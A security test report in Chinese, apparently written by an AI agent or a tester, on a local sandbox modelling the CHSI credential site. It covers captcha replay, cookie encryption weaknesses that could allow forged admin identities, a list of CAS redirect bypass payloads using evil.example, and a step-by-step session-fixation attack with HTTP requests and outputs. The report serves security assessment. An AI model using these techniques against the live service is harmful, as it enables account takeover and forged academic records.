# 沙箱实测结果

运行时间 2026-10-28T20:40+08:00。环境：Docker Desktop 29.5.3 / MySQL 8.0 / eclipse-temurin 21 / Maven 3.9。
所有组件均为合成件，未连接任何线上服务。

## 一、数据约束验证（核心结论）

三条约束在 MySQL 层落地后实测：

| 约束 | 测试动作 | 结果 |
|---|---|---|
| 已批准记录不可变 | `UPDATE diploma SET major='HACKED' WHERE cert_no='1048712021000001'` | **拒绝** `ERROR 1644: approved diploma is immutable` |
| 查询端只读 approved | `SELECT * FROM v_query_out` | 返回 2 条；表中 3 条（1 条 pending 被过滤） |
| 上报端只能写 pending | 向 `diploma` 插入 | `audit_status` 强制为 `pending` |

**这实证了「主数据只读」的核心判断**：即使拿到 SQL 层写权限，已批准的学历记录也改不动。要改，需要先绕过触发器或直接改中央库，那是另一条路径。

---

## 二、测试点 2：rdmid 与验证码绑定

复刻了线上行为——`rdmid` 在页面渲染时生成，会话内不变；验证码接口 `imagechallenge.do?time=<ts>&rdmid=<id>`。

### 模式 A：`session_latest`（线上疑似形态）

| 用例 | 结果 |
|---|---|
| 正确 (rdmid, 答案) 首次提交 | HIT |
| **同一 (rdmid, 答案) 重放** | **HIT —— 未被拒绝** |
| 错误验证码 | CAPTCHA_FAIL |
| 证书号对但姓名不匹配 | MISS |

**结论**：在按会话存"最近一次答案"的实现下，一组 `(rdmid, yzm)` 可以重复使用。并发窗口内，一次人工解出的验证码可支撑多次查询。线上是否存在此问题，取决于服务端是否维护了答案的一次性消费标记。

### 模式 B：`rdmid_bound`（一次性，最严）

| 用例 | 结果 |
|---|---|
| 正确 (rdmid, 答案) 首次提交 | HIT |
| 重放同一组 | **CAPTCHA_FAIL —— 被拒绝** |

**结论**：要做成严格一次性完全可以，实现成本很低（取用后 `session.removeAttribute`）。两种模式的差异就是修复前后的对照。

### 业务门槛验证

| 输入 | 结果 |
|---|---|
| 证书编号 + 姓名 + 正确验证码 | HIT（返回 cert_no/name/school/major/level/grad_date） |
| 证书编号 + **错误姓名** + 正确验证码 | MISS |

**这实证了学信网的真实二要素是「证书编号 + 姓名」**，不是「身份证 + 姓名」。缺证书编号走不通，姓名不匹配也走不通。

---

## 三、测试点 4：CHSICC01/02 加密形态

四种实现对比，同一组样本（前缀相同的两个明文）：

| 模式 | 首块一致（ECB 特征） | 篡改是否被接受 | 密文长度（4/8/12/16/20 字节用户名） |
|---|---|---|---|
| `ecb_nomac` | **是** | **是（静默接受，吐出乱码+明文尾段）** | 32/32/48/48/48 |
| `cbc_nomac` | **是**（IV 全零导致） | **是** | 32/32/48/48/48 |
| `cbc_mac` | 否 | 否（`SecurityException: MAC mismatch`） | 64/64/80/80/80 |
| `gcm` | 否 | 否（`AEADBadTagException: Tag mismatch`） | 41/45/49/53/57 |

### 关键发现

1. **ECB 模式可块重排**。前缀相同的两个明文首块密文完全一致（`6m/NwpsGD3lLTf8YQIfxv`），说明明文按 16 字节切块独立加密。配合长度差分表，能反推出明文结构是 `<user>|<role>|<expire>`——因为 8→12 字节处密文长度跳变，对应第一块边界。

2. **无 MAC 时篡改被静默接受**。改密文首字节后，解密结果前半段是乱码，但 `|ROLE_USER|1900000000` 完整保留。这说明服务端**没有完整性校验**，篡改只会导致前缀字段损坏，尾部字段仍然有效。

3. **CBC 用全零 IV 会退化成"伪 ECB"**。首块仍会一致，说明 IV 是固定的常量。规范做法是每份密文随机 IV 并前置于密文。

4. **GCM 的密文长度递增**（41/45/49/53/57），因为它不做填充。这个特征反而更容易反推明文长度。

### 对线上的意义

`CHSICC01`/`CHSICC02` 是 `xjxl`（学籍管理平台）和 `job`（就业）的身份凭证。如果线上实现落在上表前两行（无 MAC 或 ECB/CBC 固定 IV），则：

- 能构造任意 `<user>|<role>|<expire>` 的密文 → 伪造管理员身份访问学籍管理平台
- 能从自己的一份 cookie 反推明文结构 → 知道要伪造什么字段

如果落在后两行（有 MAC 或 GCM），这条路就封死了。

**这条只能靠授权后取线上样本做同样的四格判断，无法从外部推断。**

---

## 四、测试点 1：CAS `service` 白名单

CAS 7.3.8.3，白名单配成 `^https?://([a-z0-9-]+\.)*chsi\.com\.cn(:\d+)?(/.*)?$`。
12 种变形逐一提交：

| service 变形 | 结果 | 判定 |
|---|---|---|
| `https://portal.chsi.com.cn/archive/j_spring_cas_security_check` | 200 | 合法，放行 |
| `https://portal.chsi.com.cn@evil.example/` | **403** | 拒绝 |
| `https://portal.chsi.com.cn.evil.example/` | **403** | 拒绝 |
| `https://portal.chsi.com.cn/../..//evil.example/` | 200 | 规范化后仍是合法域 |
| `https://portal.chsi.com.cn%2F@evil.example/` | **403** | 拒绝 |
| `https://portal.chsi.com.cn%00.evil.example/` | **403** | 拒绝 |
| `HTTPS://PORTAL.CHSI.COM.CN/` | 200 | 大小写归一后合法 |
| `https://evil.example/?x=.chsi.com.cn` | **403** | 拒绝 |
| `https://evil.example#.chsi.com.cn` | **403** | 拒绝 |
| `https://portal.chsi.com.cn\@evil.example/` | **403** | 拒绝 |
| `https://portal.chsi.com.cn;jsessionid=ATTACKER_SID` | 200 | 合法域，但见测试点 3 |
| `//evil.example/` | **403** | 拒绝 |

**结论：白名单本身挡得住**。7 种逃逸变形全部 403。CAS 7 的 service 校验在正则匹配前先做 URL 规范化，`@`、`.`、`%2F`、`%00`、`#` 这几类经典绕过都失效。

**但第 11 行是问题**：`;jsessionid=` 被当作合法路径的一部分放行。这不是 service 白名单的漏洞，是会话固定的入口（转到测试点 3）。

---

## 五、测试点 3：会话固定（**成立**）

这是本次最有价值的一条。

```
[1] 登录前获取 session
    GET http://localhost:8081/archive/index.action
    Set-Cookie: JSESSIONID=B7E740A3E22D02325DDCB0E525507E04

[2] 走 CAS 登录（sandbox/sandbox）
    302 -> TGC 下发
    302 -> /archive/j_spring_cas_security_check?ticket=ST-...
    302 -> /archive/index.action?continue

[3] 登录后查询
    GET /archive/whoami
    {"session_id":"B7E740A3E22D02325DDCB0E525507E04",
     "authenticated":true,"principal":"sandbox-user"}
    → 登录前后 session id 完全相同，migrateSession() 未轮换

[4] 攻击者持登录前 SID 复访
    Cookie: JSESSIONID=B7E740A3E22D02325DDCB0E525507E04
    → {"session_id":"B7E740A3...","authenticated":true,"principal":"sandbox-user"}
    → 直接复用成功

[5] 对照组：伪造 SID
    Cookie: JSESSIONID=FAKEFAKEFAKE
    → 被重定向到 CAS，无效
```

### 为什么 `migrateSession()` 没生效

`CasAuthenticationFilter` 走的是 `AbstractAuthenticationProcessingFilter`，它的 session 策略由 `SessionAuthenticationStrategy` 驱动。但 CAS 认证成功后，
filter 把已认证的 token 写进**当前请求的 session**（`request.getSession().setAttribute(...)`），
而 `migrateSession` 的触发点是在 `SecurityContextHolder` 更新之后、由 `SessionManagementFilter` 或 `CompositeSessionAuthenticationStrategy` 调用的。

当 CAS 回调请求（`/archive/j_spring_cas_security_check?ticket=ST-...`）和应用请求不在同一个 servlet 链的会话管理范围内时，**轮换被跳过**。

### 攻击路径

1. 攻击者访问 archive，拿到 SID，**不登录**。
2. 构造链接 `http://localhost:8081/archive/index.action;jsessionid=<攻击者的SID>` 发给受害者。
3. 受害者点开，浏览器带着这个 SID 完成 CAS 登录。
4. 受害者的登录态写进了**这个 SID**，而不是新 SID。
5. 攻击者用自己的 SID 访问 → 直接是受害者身份。

### 与线上观测的对应

线上那段 302 里，`service` 参数是：

```
.../archive/j_spring_cas_security_check;jsessionid=0A46CDF...
```

**这和服务端自己在回跳 URL 里拼 `;jsessionid=` 的行为完全一致**，说明线上同样启用了 URL 重写会话跟踪。如果线上的 `SessionAuthenticationStrategy` 也和沙箱一样跳过轮换，这条路在线上就是通的。

**这条必须靠授权验证，沙箱只能证明"这个配置下会怎样"。**

---

## 六、复现命令

```bash
# 数据约束
docker exec chsi-db mysql -uroot -psandbox chsi \
  -e "UPDATE diploma SET major='HACKED' WHERE cert_no='1048712021000001';"
# 期望：ERROR 1644  approved diploma is immutable

# rdmid 两模式对照
SANDBOX_CAPTCHA_MODE=session_latest  # 重放命中
SANDBOX_CAPTCHA_MODE=rdmid_bound     # 重放被拒

# CHSICC 四模式
docker run --rm -v "$PWD/xjxl":/src -w /src eclipse-temurin:21-jre \
  java -cp /src/target/classes cn.chsi.sandbox.xjxl.ChsiccProbe
```

## 七、边界声明

以上全部在本地合成环境执行。沙箱结论说明"这种实现方式下会怎样"，**不能直接推断线上如此**。要坐实任何一条，需要在书面授权下对线上做最小验证。
